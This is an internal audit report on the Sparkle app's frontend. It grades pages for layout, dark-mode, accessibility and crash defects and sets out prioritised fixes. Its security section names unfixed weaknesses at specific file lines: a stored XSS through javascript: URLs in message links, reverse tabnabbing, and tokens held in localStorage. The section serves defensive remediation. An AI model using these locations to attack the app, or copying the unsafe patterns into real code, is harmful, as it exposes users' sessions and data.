# Sparkle Frontend UI Audit — Page by Page, Component by Component

**Date:** 2026-10-04 · **Scope:** `frontend/src` — 73 pages, 101 components (~48,300 lines), read-only code audit (7 parallel passes, shared rubric)
**Rubric:** positioning/overlap · responsiveness · spacing/consistency · interaction · contrast/dark-mode · icons · loading/error/empty states · a11y
**Grades:** **A** ship · **B** minor polish · **C** notable issues, needs a pass · **D** broken in a common mode (dark, mobile, desktop-sidebar) or crash/data-loss/accidental-action defect

**Pass 8 (2026-10-07):** re-audit at HEAD `ab69111` before frontend fixes — 4 parallel static passes (P0 staleness · post-audit code delta · security · route/control/env integrity). Results in **Appendix A**; §3 P0 updated with ✅/⚠️ markers and **new items 19–26**; exec-summary counts corrected in A.5.

---

## 1. Executive summary

| Grade | Count (approx.) | Meaning |
|---|---|---|
| A | 4 | Only `main.tsx`, `StatusBarController`, `ForwardSearchBar`, `SkillOfferModal` (A-) |
| B | ~45 | Workable, polish needed |
| C | ~85 | Noticeable problems in daily use |
| D | ~30 | Broken in a common mode — see §3 P0 |

Headlines:

1. **The layout shell has no tokens.** Navbar is really 72px + safe-area; pages derive it 10 different ways (`pt-4rem/5rem/6rem`, `pt-16/20/32`, `top-[70px]/[81px]/[105px]`, `padding-top:30px/70px`) — so content is hidden under the header on ~10 pages and floats with gaps on others. The desktop sidebar is 72px (hover 240px) but content offsets are `lg:ml-72` (= **288px**, wrong breakpoint) on ~35 pages, **nothing** on ~15 pages (content slides under the rail at 768–1024px), and ad-hoc `96px`/`820px`-centered containers elsewhere. Container widths: 10+ distinct values with no system.
2. **z-index is an arms race, not a ladder** — 25+ distinct values (`0…11000/99999`). At least **10 overlays render *below* app chrome** (`z-1000/1100`) and are partially unusable: FollowRequestsOverlay (z-50), Notifications sheet (z-50), FollowListModal (z-100), ProfileShareModal (z-100/101), Support modal (z-100), PollDetail sheets (z-100/110), IdentityVerification incl. camera (z-250/600), ChatSettingsModal (z-200), SellItem sheet (z-60), MarketplaceSettingsModal (z-200). And the compose FAB (`z-[9999]`, rendered later in DOM) sits **above modal scrims**.
3. **Dark mode is 42 `!important` monkey-patches in `index.css`, not `dark:` variants** — alpha is stripped (`text-black/20` renders solid white), every `bg-white/*` is forced to opaque `#000`, two `.dark html` rules can never match, and ≥12 pages have **zero** `dark:` variants (light island in dark theme) while ≥6 pages are hard-dark (dark island in light theme). The app looks like a different product per route.
4. **Accessibility is near-absent:** across 174 files there are ~10 `aria-label`s total, essentially zero `role=`, no focus traps, one `Escape` handler repo-wide, dozens of `div onClick` controls, ~10 dead `htmlFor`-less forms, hover-only affordances that don't exist on touch, `text-[7px]`–`[9px]` type 40+ times, and `prefers-reduced-motion` in only 4 files.
5. **~40 visibly dead controls ship** (buttons with no `onClick`, search inputs with no state, fake QR scanner, fake analytics, "coming soon" screens) and **~60 native `alert/confirm/prompt` calls** are the feedback layer while other errors vanish into `console.error`. Worse: **7 runtime crashes** are type-check-suppressed because the build runs `vite build` without `tsc` (**708 TS errors**).
6. **Undefined tokens:** `marketplace-*` utilities are used **~298 times with zero definitions** (transparent inputs, borderless chips across 15 files) — a one-line `@theme` fix. `var(--bg-main)` (Support, Ecosystem), `secondary`, `.video-error-placeholder`, and 3 image fallback paths are also undefined/missing.

---

## 2. Systemic issues (consolidated across all slices)

**S1 — No shell/layout token system (positioning, critical).**
Header height re-derived per page (10+ variants); sidebar offset missing/mismatched on ~20 pages; 10+ container widths (576/672/700/820/896/900/1000/1080/1100px + `max-w-2xl…7xl`); bottom padding ad hoc (`pb-20/28/32/56/64`, `mb-12`). ~10 pages render **no Navbar/sidebar at all** (Memories, GroupDetail, PollDetail imports-but-never-renders, most marketplace subpages, ProfessionalDashboard, AI screens, TicketDetail…).
→ *Fix:* CSS vars `--header-h: calc(72px + env(safe-area-inset-top))`, `--rail-w`, `.pt-safe/.pb-safe/.pl-safe`, one `<PageShell>` (or layout route with `Outlet`); delete per-page math.

**S2 — No z-index scale (25+ values, ≥10 broken overlays) (critical).**
Fix list is one-line-each: raise FollowRequestsOverlay 50→1500, Notifications sheet 50→1500, FollowListModal 100→1500, ProfileShareModal 100/101→1500, Support 100→1500, PollDetail 100/110→1500, IdentityVerification 250/600→1500+, ChatSettingsModal 200→1500, SellItem 60→1500, MarketplaceSettingsModal 200→1500; FAB 9999→9998 (below scrims); then codemod all literals to `--z-scrim/sheet/modal/chrome/toast` tokens.

**S3 — Dark mode via `!important` hacks instead of tokens (critical).**
`index.css:193` forces all `bg-white/*`→`#000` (kills glass, hides ModernOfflineState tile, SpinnerFullscreen backdrop, makes Verified's white track black); `:210` strips alpha from `text-black/20–90`; `.dark html` rules (L164/183) can never match → pink overscroll in dark; dead targets (`.navbar/.card/.modal-content/.secondary-btn/.bg-app` = 0 usages). ≥12 light-only pages, ≥6 dark-only pages.
→ *Fix:* define light/dark values in `@theme`; convert per component; start with the crash screen (ErrorPage) and highest-traffic pages.

**S4 — Global input reset kills borders & focus rings (critical, one edit).**
`index.css:327–329` unlayered `input,textarea,select { border-none outline-none focus:ring-0 }` beats every layered utility → invisible borders and no keyboard focus on ResetPassword/Verified and any future form. → wrap in `@layer base`, drop `border-none`.

**S5 — Accessibility baseline missing (critical).**
~10 `aria-label`s in 174 files; zero `role="dialog"`/focus traps; one `Escape` (HighlightPlayerModal); `div onClick` controls everywhere (Navbar search/Plus, ListingDetail CTAs, AdminDashboard rows, StoryViewer toggles…); labels without `htmlFor` (Signup ×6, SellItem, ReportListing, ListingModal, Support, EventModal, CreateGroup…); hover-only affordances dead on touch (FollowRequestsOverlay accept/reject, LostFound share, GroupSettings cover, ListingModal remove-photo); touch targets <40px (26px filter tabs, 20px LocalPreview switch-camera, 24px toggles, 32px actions); `text-[7/8/9px]` 40+×; no global `prefers-reduced-motion` (only Login/Signup/Forgot/SparkleLiveHero).
→ *Fixes (high ROI):* one line `<MotionConfig reducedMotion="user">` in App.tsx; `aria-label`+`aria-current` on the 7 bottom-nav links; shared `<IconButton label>` + `<ModalShell>` (dialog+Escape+trap+lock); global reduce-motion block in `index.css`; min-12px/40px-target utilities.

**S6 — Dead & lying UI (~40 dead controls, fake data) (critical).**
Dead buttons: Events "Access Pass" (biggest CTA), Ecosystem Launch/Download ×4, ProfessionalDashboard Ad Manager/Withdraw/Pay Now/Open Full Pulse, Help FAQ/4 buttons (FAQ only opens on hover — unusable on touch!), Signup Google + Resend, ListingDetail Follow/Search, MyListings More, ShareModal More, NoteEditor Search, Memories Share, SellerProfile Star, SettingsModal "Change photo" + 3 "coming soon" tabs, MarketplaceModals ×8, ListingModal/ListingDetail dead states. Dead inputs: Clubs/Events/LostFound/Help search. Dead/placeholder pages: AI FriendDiscovery + SearchSparkle ("coming soon" ×2), MilestoneTracker ("XP coming soon"), EventsAdmin QR scanner (fake), Leaderboard (Alice/Bob/Carol), AnalyticsDashboard (mockStats), Notifications (mock rows injected), ProfessionalDashboard (fabricated stats), Verified (setTimeout submit), LoadingBar (fake progress), Streams (800ms fake loader + Unsplash mocks), Camera flash (no torch), Camera "live" mode (takes a photo), Zoom (preview-only, capture ignores it). Broken route: `/confessions/:id` → 404. `MicrophoneShowcase` imports `three`/`@react-three/*` which are **not installed** → lazy chunk fails.

**S7 — Runtime crashes hidden by skipped type-checking (critical).**
Build is `vite build` (no `tsc`) with **708 TS errors**. Crashes: `PostDetail` uses `clsx` without import (ReferenceError on first sort-tap); `Settings` dead branch uses `<Bell>` un-imported; `LockedLivePage` references **undeclared `followers`** → white screen for every user <1000 followers; `ForwardMessage` page (wrong `../../` imports, missing `ForwardSection`, wrong `useSelection` API — unrouted); `ForwardListItem` imports non-existent `ChatItem` type; `MicrophoneShowcase` (missing packages); `MarketplaceSettings` renders `null` on fetch error while its error banner is unreachable; `PostCommentsModal` `setIsExpanded` never called (200-char comments permanently clamped).

**S8 — Feedback layer is `alert()` or silence (major).**
~60–70 native `alert/confirm/prompt` across ~25 files (PostCard 11, PostOptionsModal 10, EventsAdmin 7, AdminDashboard 5, …) while other failures only `console.error` (invite, poll, member actions, gallery, marketplace fetches, camera). Four toast systems coexist (`utils/toast` react-hot-toast, Moments local, Search local, Login/Forgot CSS) + `hooks/useToast` import in ForwardMessage points nowhere.
→ *Fix:* one toast API; rule: every `catch` produces user-visible state; `confirm→ConfirmDialog (undo for delete)`.

**S9 — Wrong scroll model at the root (major).**
`AppScreen` owns the scroller, so `window.scrollTo()` (Dashboard:181, VirtualizedFeed:337) and `document.body.style.overflow` locks (PostCommentsModal, ArchiveModal, NoteEditor) are **no-ops** → background scrolls behind sheets; `PullToRefreshProvider`'s `scrollTop===0` guard targets a container that never scrolls → any ≥70px drag anywhere fires refresh, its indicator hides behind the navbar, content shifts 1.5×, and the transform drags fixed chrome (navbar/tab bar) during pull.
→ *Fix:* export `scrollTopTo()/lockScroll()` helpers off AppScreen; reattach PTR gesture to the real scroller.

**S10 — `100vh` + safe-area chaos (major).**
`100vh` in AppScreen, PullToRefresh, SafeLayout, MarketplaceInbox, FeelingActivitySelector, TicketDetail (`100vh` + **invalid `pt: 70px`** → header hidden) while `.h-screen-safe` (100dvh) already exists unused. Zero `env()` in MarketplaceChat, CallOverlay, camera chrome, Streams, StoryViewer (uses non-existent `safe-area-inset` class), CreateStory (phases are `absolute inset-0` so root padding is ignored), TicketDetail. Messages pads safe-area **twice** (AppScreen + StatusBarBackground ×2). `index.html` lacks `interactive-widget=resizes-content` → keyboard covers the chat composer on mobile web.

**S11 — Component `<style>` blocks redefine global CSS (major).**
`.animate-shimmer` ×3 (App, ProgressiveImage, VirtualizedFeed), `fadeIn` ×3, `spin-slow` ×3 conflicting durations (30s vs 45s), `CreationHubModal` retimes every `animate-fade-in` app-wide while open, `ErrorPage` injects a **second `@keyframes pulse`** that silently changes Tailwind's `.animate-pulse` everywhere, `ProfessionalDashboard` **remaps the global `.font-sans`** + per-mount Google Fonts `@import` (also SkillMarket, SkillDetailModal, SkillOfferModal). Login/Signup/Forgot carry 480/330/190-line inline style blobs.
→ *Fix:* all keyframes in `index.css` once; delete component copies; fonts in `index.html`.

**S12 — Duplication (major).**
4× `formatCount`; 4× @-mention autocomplete (all missing keyboard nav/aria); 5× listing card with 5 geometries; 5× message bubble (2 live + 3 dead files); 2× Follow-requests with *different field names* (`id` vs `request_id`); 3× Settings UIs (pages/Settings, modals/SettingsModal, MarketplaceSettings×2); 46 raw `animate-spin` rings in 29 files vs the one accessible `<Spinner>`; 3 icon systems (lucide + Font Awesome CDN + Bootstrap Icons CDN) + emoji/`✦` glyphs as icons; hand-rolled SVGs duplicating lucide.

**S13 — Loading/error/empty & CLS (major).**
Errors masquerade as empty states (Marketplace, MyListings, Orders, Wishlist, Gallery renders a **Spinner as its empty state**, SkillDetailModal `return null` flash, MarketplaceChat infinite "Loading..."); three competing loading patterns; no shared `<ErrorRetry>`; images/videos without dimensions (ProgressiveImage root has no height → skeleton never shows in aspect cells; PostDetail img; Avatar no width/height; Profile grid `<video>` missing `muted/playsInline`); CountdownTimer renders `null` for 1s then pops; VirtualizedFeed "fake virtualization" (mounts everything, 280px default skeleton → CLS).

**S14 — Undefined tokens & missing assets (major, cheap fixes).**
`marketplace-*` ×298 usages, 0 definitions → transparent search input, borderless chips/pills, "muted" text at full black (one `@theme` block fixes ~300 elements). `var(--bg-main)` never defined (Support/Ecosystem always light). `secondary` class never generated. `.video-error-placeholder` has no CSS. Missing images: `/uploads/defaults/no-image.png` (Marketplace + GlobalEffects), `/placeholder-avatar.png` (RemotePlaceholder). `ProgressiveImage` forces `loading="eager"` after the spread → every feed image eager.

**S15 — Type-check debt (major).**
708 `tsc` errors (PostCard 38, Dashboard 25, Search/Profile 10…); props accepted-but-ignored (`onDeleted`, `onRemove`) so callers' UI never updates; `tsc` gates nothing.

---

## 3. Priority action list

### P0 — Broken today (fix first; mostly small edits)
1. `PostDetail`: add `import clsx from 'clsx'` (crash on sort tap). — **✅ FIXED** (`PostDetail.tsx:9`, `187288c`)
2. `LockedLivePage`: declare `followers` (white screen for most users). — **✅ FIXED** (`LockedLivePage.tsx:54`)
3. `index.css:327`: wrap input reset in `@layer base`, drop `border-none` (focus rings/borders return app-wide). — **❌ still broken** (`index.css:340-342`, unlayered; `border-none` present)
4. `index.css` `@theme`: add `--color-marketplace-{bg,text,muted,border}` (+ `--color-secondary`, `--bg-main`) → fixes ~300 marketplace elements + 2 pages. — **❌ still broken** (`index.css:12-24` has no marketplace tokens; 299 usages/12 files)
5. z-bump the 10 overlays below chrome + FAB 9999→9998 (S2 list). — **❌ still broken** (11/11 values unchanged; + Settings Account-Control sheet `z-50` below rail → also raise, see A.3 #14)
6. Remove `<MarketplaceModals/>` duplicate mount (`Marketplace.tsx:403` — already in `App.tsx:320`) → double backdrop + double job polling. — **❌ still broken** (`App.tsx:421` + `Marketplace.tsx:434`)
7. `PostCard`: stop liking the post when tapping the comment/share counts (row-level onClick). — **❌ still broken** (`PostCard.tsx:609-615`, `:645-650`; counts at `:639-640`, `:683-691` no `stopPropagation`)
8. `HlsVideoPlayer`: don't `load()`+reset on `active` toggles (pausing a reel rewinds it); apply `poster`. — **❌ still broken** (`HlsVideoPlayer.tsx:114`, `:118`, no `poster` attr)
9. `StickerRenderer`: reset motion x/y after drag commit (drag drifts off-canvas). — **❌ still broken** (`StickerRenderer.tsx:60-69` never resets motion values)
10. `FollowRequestsOverlay`: accept/reject are `opacity-0 group-hover` → invisible on touch/keyboard. — **❌ still broken** (`FollowRequestsOverlay.tsx:93`)
11. `Confessions`: fix dead route `/confessions/:id`. — **⚠️ partial**: route + backend exist (`App.tsx:468`, `GET /confessions/:id` since `ab69111`), but `Confessions.tsx` reads **no URL param** → taps/share links still show the list (see A.3 #6)
12. `Help`: FAQ needs `onClick` (currently hover-only → unusable on mobile). — **❌ still broken** (`Help.tsx:68-74`, `:149-151`; file untouched since pre-audit)
13. `MarketplaceSettings`: render error state instead of `null`; rollback failed optimistic save. — **❌ still broken** (`MarketplaceSettings.tsx:76`, `:52-62` no rollback)
14. `MicrophoneShowcase`: remove/replace missing `three` deps (broken lazy chunk). — **✅ FIXED** (deps resolvable from root `node_modules`; `dist` chunk builds 920 KB; caveat: not declared in `frontend/package.json` → fragile, prefer declaring)
15. `ErrorPage`: fix dark-mode crash screen (unreadable 1.7:1) + delete its global `@keyframes pulse` override. — **❌ still broken** (`ErrorPage.tsx:50-54` global keyframes; `:16/:19` hex text on forced-black card)
16. `NoteEditor`: GIF click must not overwrite the typed note; fix hide-from checkbox id mismatch. — **⚠️ partial**: GIF overwrite still broken (`NoteEditorModal.tsx:399`); checkbox mismatch **N/A** (row rewritten as button `:249-258`, no checkbox remains)
17. `MessageActionModals`: `MessageMoreModal` transform (off-center on screen), scoped emoji-picker CSS (currently leaks `width:100vw !important` globally). — **❌ still broken** (framer `transform` vs Tailwind v4 `translate` double-apply `:122-127`; unscoped `<style>` `:194-220`)
18. `Login/Signup/Forgot`: remove `VERSION 3.0.2` debug string (Login), wire or hide Google/Resend dead buttons. — **⚠️ partial**: `VERSION 3.0.2` still shipped (`Login.tsx:364`); Google still dead (`Signup.tsx:317-321`); Resend **✅ wired** (`Signup.tsx:583`, `Login.tsx:494`)

**Pass-8 verdict: 3 fixed (1, 2, 14) · 13 still broken · 3 partial (11, 16, 18).** None of the §3 items regressed; the fix batches only did logger swaps/H20 offsets/resend wiring.

### P0 — added by Pass 8 (2026-10-07, see Appendix A)
19. **(deploy-critical)** `frontend/.env.local` → `VITE_API_URL=http://127.0.0.1:3000/api` is **baked into the shipped `dist/`** (5× in `index-B_d5PGUc.js`, verified) → every API call from that build hits loopback. Delete/override the key; never ship a `dist/` built on this machine; re-verify a clean build contains zero `127.0.0.1` (A.5.6).
20. **(security-High)** Stored XSS: attacker-controlled `message.media_url`/`file_url`/`link.url` rendered as clickable `href` → `javascript:` executes in-origin on click (4 sinks: `Messages.tsx:4393`, `SharedContentExplorer.tsx:315,375,576`; backend accepts verbatim `messages.controller.js:263,277-279`). Guard `^https?://` client-side + validate scheme server-side (A.4 #1).
21. `server.js` CORS: add `exposedHeaders: ['x-refresh-token']` — without it the H26 renewal-header adoption is a **no-op in every cross-origin deploy** (Vercel→Render and dev) (A.3 #2).
22. Add `role` to both re-signed JWT payloads (`auth.middleware.js:85-91` renewal, `auth.controller.js:394-399` 2FA) — today admins lose the sidebar **Admin** entry ~7.5 min after login (or immediately via 2FA) and get redirected off `/admin` (A.3 #1).
23. Moments H20 regression: restore `lg:ml-72`/`lg:pl-72` on `Moments.tsx:1103, 1138, 1354, 1367, 1388` — the 5 `fixed`-ancestor children lost their rail offset; the sidebar covers the left 72px of every reel (A.3 #3).
24. Onboarding: **nothing ever sets `currentSlide = 2`** → slide 2 unreachable, progress jumps "Step 1 of 5" → "Step 3 of 5" (`Onboarding.tsx:35-172`); route through it or delete it + fix the step label; fix Slide2's white-on-white light-theme text while there (A.3 #4, #8).
25. **16 dead links in 8 files** + 5 orphan routes (A.5.1/A.5.2) — retarget `/accounts-center`, `/settings/privacy`, ``/clubs/${id}/settings``, `/stories`×2, `/music`, 3 dead AI routes, and the 6 phantom `/settings/*` entries in `AccountsCenter`.
26. `window.open(url, '_blank')` without `noopener` on 3 user-URL sites → reverse tabnabbing (`MediaPreviewModal.tsx:38`, `ArchiveModal.tsx:164`, `ProfessionalDashboard.tsx:228`) (A.4 #6).

### Security quick wins (Pass 8 — previously unaudited dimension; full detail in A.4)
- **High:** #20 XSS above → P0. Storing access+refresh tokens for **all** accounts in `localStorage`, plus an immortal `sparkle_signup_refresh` that survives logout (A.4 #2), is also High but architectural → schedule as **P1 security work** (httpOnly-cookie refresh token; purge `sparkle_signup_*` on logout).
- **Medium → P1:** OTA bundle hash never verified (A.4 #3); no CSP/SRI on the SPA origin (A.4 #4); prod console logs print `Authorization` + `x-refresh-token` (A.4 #5); SW `api-cache` survives logout (A.4 #7).
- **Low → P2:** Giphy key in bundle, email+OTP in URL query, no client file validation, unsandboxed TikTok iframe, un-revoked object URLs (A.4 #8–12).
- **Verified safe (A.4 S1–S8):** both `dangerouslySetInnerHTML` sites are static CSS; no `eval`/`javascript:` literal anywhere; markdown/chat/profile links scheme-locked; no open-redirect; no real secret reaches `dist` except the shared Giphy key.

> **Staleness note:** §3 items 1–18 and the §4/§5 grades below are the 2026-10-04 pass (215 files changed since — line numbers drift and a few claims are superseded). The authoritative current state = the ✅/❌/⚠️ markers in §3 + **Appendix A** (Pass 8), which also corrects exec-summary counts (~40→**≈60** dead controls, ~60→**140** native dialogs, 708→**927** TS errors) and retires stale claims (Notifications mock rows, Leaderboard as a live page, `three` chunk failure, ProfessionalDashboard dead buttons).

### P1 — Systemic quick wins (1–2 days, huge payoff)
- **Tokens:** `--header-h`, `--rail-w`, `.pt-safe/.pb-safe/.pl-safe`; `--z-*` scale; codemod z-literals; replace 8+ header offsets and ~35 `lg:ml-72`s.
- **Shell:** `interactive-widget=resizes-content` in viewport meta; swap `100vh`→`100dvh` (6 files); drop Messages' double safe-area; env() in MarketplaceChat composer, CallOverlay, camera footer, StoryViewer, TicketDetail (`pt`→`padding-top`).
- **Scroll:** `scrollTopTo()/lockScroll()` off AppScreen (6 call sites); reattach PullToRefresh to the real scroller; fix its double-shift.
- **Motion/a11y:** `<MotionConfig reducedMotion="user">`; global reduce-motion block; `aria-label`/`aria-current` on bottom nav; `role="status"` on Offline/OTA/PTR; min-40px target + min-12px text rules.
- **Feedback:** map ~60 `alert/confirm` → toast/confirm dialog; standardize `<Skeleton>`+`<EmptyState>`+`<ErrorRetry>`; delete the 3 redundant toast systems.
- **Dead-code sweep (document in DELETIONS.md style):** `App.css` (never imported), ForwardMessage + forward/* (unrouted/broken), MessageBubble/SwipeableMessage/GifMessage/PrivacySettingsModal/modals-MessageActionModal (dead chat set), RemotePlaceholder, FloatingAIButton (commented out), `AnimatePresence`-less exit variants, dead CSS classes (`.app/.dashboard-grid/.glass-input/…`), `md:size={…}` props, `sidebar popup` clipping.
- **Fonts/keyframes:** hoist all component `<style>` keyframes + Google Fonts `@import` to `index.html`/`index.css`; remove `.font-sans` remap in ProfessionalDashboard.
- **Crash debt:** fix the 7 S7 items; then run `tsc` on the feed path (PostCard → VirtualizedFeed → Dashboard).
- **Image hygiene:** fix fallback paths; `loading="lazy"` default in ProgressiveImage (before spread); `width/height`/`aspect-*` on media; Profile video `muted/playsInline`.

### P2 — Structural (schedule properly)
1. `<PageShell>` layout route with `Outlet` (sidebar/header/offsets once) — migrate pages off per-page math.
2. Shared `<ModalShell>` (dialog role, Escape, focus trap, scroll lock, z token) — retrofit 30+ modals; single `useModalA11y` hook.
3. `<ListingCard variant>` (5→1), `<PostHeader>` (2→1), `<MentionAutocomplete>` (4→1, add keyboard nav), `<PostCard>` stats row ownership, follow-requests unification (2→1, reconcile field names), Settings unification (2–3→1).
4. Dark-mode strategy: replace `!important` hacks with `@theme` tokens + `dark:` per component; kill the light/dark split personality (auth pages light-only, Invite/Storage/ CreateMoment dark-only…).
5. Real data behind gamification (Leaderboard/Analytics/Reward*) or hide the entry points; wire camera torch/zoom/live-mode or remove controls.
6. Turn `tsc --noEmit` on in CI; add smoke tests for the P0 crash paths.

---

## 4. Grade overview — pages (74)

| Page | Grade | Headline |
|---|---|---|
| Login | B | Light-only page in dark theme; 480-line inline `<style>` blob; invisible label icons `#d4d4d4` |
| Signup | C | Labels have no `htmlFor` (×6); Google + Resend buttons dead; 2-col grid no breakpoint (126px fields @375px) |
| ForgotPassword | B | Light-only; 190-line style blob; `autoFocus` on load |
| ResetPassword | D | `text-6xl` + `p-12 md:p-24` overflows at 375px; no focus rings (S4); contrast 1.9:1 |
| Onboarding | C | No sidebar offset (overlaps 768–944px); `p-12 md:p-20`/`text-6xl` desktop-scale; redefines `animate-spin-slow` |
| Verified | C | Dark progress bar invisible (white track forced black); invalid `md:size` props; fake submit; stats fail → silent zeros |
| NotFound | C | 100% inline styles; light-only gradient; no hover on primary CTA |
| ErrorPage | D | **Crash screen unreadable in dark** (1.7:1); injects global `@keyframes pulse` override; dead classes |
| About | B | Inline white background → light page in dark; emoji avatars; container 900px vs siblings |
| Help | D | FAQ hover-only (dead on touch); 4 dead buttons; content 60px offset under 72px header; nested `100vh` scroller; dead search |
| Invite | D | Navbar imported, never rendered; white cards + white text on dark gradient (invisible in light); rAF loop on error path |
| LearnMorePage | B | `Suspense fallback={null}` → blank holes; no nav chrome |
| Dashboard | C | `pt-64px < 72px navbar`; `window.scrollTo` no-op; `max-w-[1035px]` one-off; 25 tsc errors |
| Explore | D | Sticky header `top-0 z-40` slides **behind** fixed navbar; chips not keyboard-operable; 9 dark: total |
| Search | D | `text-gray-900` on dark bg (invisible in dark); sticky `top-[81px]/[105px]` magic; action sheet z-tie w/ nav |
| SearchHistory | C | 0 `dark:` (whole page light in dark); `text-black/10` icons invisible; hover inverts whole row |
| PostDetail | D | **`clsx` unimported → crash on sort tap**; 0 `dark:`; no top offset under navbar; sheet breakpoint `lg:` vs sidebar `md:` |
| Profile | C | Custom top bar `left-0 lg:left-72 z-100` (wrong at md, below navbar); tabs overflow @375px; grid `<video>` no `muted/playsInline` |
| Notifications | D | Detail sheet `z-50` **under** chrome; `text-gray-900` unreadable in dark; mock rows injected; 4× `alert()` |
| FollowRequests | D | No `lg:ml-72` (under sidebar); 0 `dark:`; duplicate of FollowRequestsOverlay with different field names |
| BlockedUsers | D | No sidebar offset; 0 `dark:`; `window.confirm`; no loading/empty parity |
| Hashtag | B | `pt-20 md:pt-32` vs 72px navbar; `pb-64` double-counts bottom nav |
| Memories | D | Navbar imported, never rendered; preview modal `z-[100]` under chrome; "Share" button has no onClick |
| AccountsCenter | D | `text-black opacity-10/20` invisible in **both** modes; 0 `dark:`; `text-6xl/9xl` headline |
| Connect | D | Filter bar `sticky top-6` hides under navbar; 4th distinct offset (96/48px); skeletons invisible in light |
| Settings | C | Dead branch with un-imported `<Bell>`; toggles are non-focusable divs (no `role="switch"`); duplicate `.sparkle-input` CSS |
| Messages | C | Composer covered by keyboard (no dvh/interactive-widget); **no sidebar offset** (rail covers chat list); double safe-area; wrong neighbour indexing when filtered; no history loading/error state; 37 inline styles/173 hardcoded-px |
| MessagesSettings | B | Light-only `#fdf2f4`; save errors swallowed; toggles without switch semantics |
| ForwardMessage | D | **Unrouted + broken**: wrong `../../` imports, missing `ForwardSection`, wrong `useSelection` API, mock data — delete or rebuild |
| MarketplaceChat | C | 100% light theme slab in dark; zero safe-area (notch/home-indicator); **two context menus per tap**; infinite "Loading..." on error; no empty state; menu overflows @375px |
| Moments | C | Loading captions `text-black/20` on black (invisible); scrubber overlaps info chips; Giphy picker clipped ≤700px; hearts burst on comment/save taps; 0 aria |
| MomentDetail | C | Back link under bottom nav; `opacity-20` links; light theme vs black Moments vs `#0a0a0f` CreateMoment (3 themes in 1 flow); 2 dead buttons |
| CreateMoment | C | Entire UI in raw `<style>` hard-dark; no `lg:ml-72`; upload errors console-only; `div onClick` wrapping a real button |
| StoryViewer | D | Non-existent `safe-area-inset` class → under notch; duplicate progress-advance effects; `isPaused` never set (pause dead); stickers under tap-zones (z-10 < 20); settings toggles are divs; fake "Saving…" setTimeout |
| CreateStory | C | `absolute inset-0` phases ignore root safe-area padding; `alert()` errors; grid-cols-3 full-screen; loading text `white/20` (~1.5:1) |
| StorySnapshot | B | Back goes to `/notifications`; unlabeled icon; `h-screen` not dvh |
| Streams | C | All CTAs are `alert()`; sticky header no env(); fake 800ms loader + Unsplash mocks; dead empty-state code |
| LockedLivePage | D | **Undeclared `followers` → white screen** for <1000 followers; 3 infinite animation families w/o reduced-motion; non-button CTA; fake 400ms loader |
| Marketplace | C | `marketplace-*` tokens undefined (~transparent inputs/chips); `mx-auto` fights `lg:ml-72` (feed pinned left ≥1024px); duplicate `<MarketplaceModals/>` mount; error = "No results"; broken fallback image path |
| ListingDetail | D | Image dots never change image (`setActiveImage` unused); no sticky buy bar; 6 dead/unfocusable controls; `alert()`; dark-mode misses (`slate-700/800`) |
| SellItem | C | Labels unassociated; `outline-none` no focus; silent validation + `alert()`; 10-photo cap unenforced; objectURL leak; no Navbar |
| MyListings | B | "More" button has no onClick; `confirm/alert` ×3; spinner vs skeletons elsewhere; card geometry ≠ feed |
| Orders | B | Row `div onClick` (no keyboard); error → "No orders found"; 4th container width |
| MarketplaceOrder | B | Hint warning visible at first paint; `alert()`; price `0/negative` accepted; mock bypass w/ Unsplash in prod |
| Wishlist | B- | "0 items saved" flashes before load; trash with no confirm; price pill clipped (`overflow-hidden`, no truncate); tiny hit target (title only) |
| SellerProfile | C | Star button dead + `handleFollow` never rendered; `window.prompt` replies; verified badge renders even when unverified; contradictory "joined 2024/2026" |
| ReportListing | B- | Focus-invisible radios; contrast 2.5–3:1; `alert()`; no submit pending state; 40-word ALL-CAPS paragraph |
| MarketplaceSafety | C | Controls `absolute -bottom-16` collide with footer @375px; `text-white/10` invisible; forced `#0A0A0A` island; pagination dots not clickable |
| MarketplaceSettings | C | **Blank page on fetch error** (error banner unreachable); optimistic save no rollback; toggles without switch semantics; duplicates MarketplaceSettingsModal |
| Clubs | C | Search input has no `value/onChange` (dead); `text-black/10–20` text; 0 `dark:` |
| ClubDetail | C | 0 `dark:`; tabs no `tablist` roles; `text-black/10` headings; join errors console-only |
| Groups | B | Decorative blobs light-tuned; fetch errors → "no groups" indistinguishable |
| CreateGroup | C | No `lg:ml-72`; privacy switch is `div onClick`; 0 `dark:`; `animate-in` classes no-op (plugin absent) |
| GroupAdmin | B- | 0 aria; 0 `dark:`; spinner-only lists |
| GroupDetail | C | **No Navbar at all**; hardcoded `#fafafa`; tabs without roles; 3× duplicated action buttons |
| Confessions | C | **Dead route `/confessions/:id`** (404 on tap); reaction popover no dismissal; emoji picker `theme="dark"` in light mode; `window.innerWidth` grid (no resize) |
| Polls | C | Cards `div onClick` (unk keyboard); conflicting top offsets; amber-on-white 1.9:1 |
| PollDetail | C- | Navbar imported, never rendered; vote/invite sheets `z-100/110` **under** chrome; no radio semantics; `alert()` |
| Events | D | **Biggest CTA "Access Pass" has no onClick**; search input dead; `text-black/10` ×10; 0 `dark:` |
| EventsAdmin | C | Fake QR scanner ("Initializing Lens…"); 7× `alert/confirm`; `text-[7/8/9px]` ×8; 36px toggles unlabeled |
| SkillHub | C | `.sh-overlay z-1000` = chrome tier (header paints over); light-only component CSS; star buttons unlabeled; `alert()` |
| SkillMarket | C | `padding-left:96px` ≠ sidebar; sticky `top:8px` under header; per-mount Google Fonts `@import`; light-only CSS |
| Gallery | B- | **Empty state = Spinner** (perpetual loading); `text-black/10`; all `alt=""` |
| LostFound | D | Report modal no `max-h` (taller than viewport @375px); sheet `z-1000` under header `z-1100`; dead search + dead share; share hover-only (touch-invisible) |
| Support | D | Ticket modal `z-100` under chrome; content 30px offset under 56px header; no `lg:ml-72`; labels unassociated; `var(--bg-main)` undefined → dark broken; nested scroller |
| Support/TicketDetail | D | **Invalid CSS `pt: 70px`** → zero offset, header hidden; reply box under bottom nav; `100vh`; nav blinks between states |
| AdminDashboard | C | 32px unlabeled moderation buttons; sticky `top-16` under header; 5× alert/confirm; `text-[8/9px]` ×13; 0 `dark:`; `key={i}` rows |
| StorageIntelligencePanel | B- | Forced dark `#0f0f0f` island in light theme; unlabeled refresh; cleanup w/o confirm; `white/30` labels |
| Ecosystem | C | 820px container, no offset/under header; 4 dead buttons (Launch/Download); copy button overlaps code; `var(--bg-main)` undefined |
| ProfessionalDashboard | C | No Navbar + own sticky header; **redefines global `.font-sans`** + per-mount fonts; 4 dead buttons; `text-[7/8/9px]`; fabricated stats |
| ai/SparkleAIScreen | C | No nav chrome/back; no `aria-live`/auto-scroll; errors as fake assistant bubbles; all-inline styles |
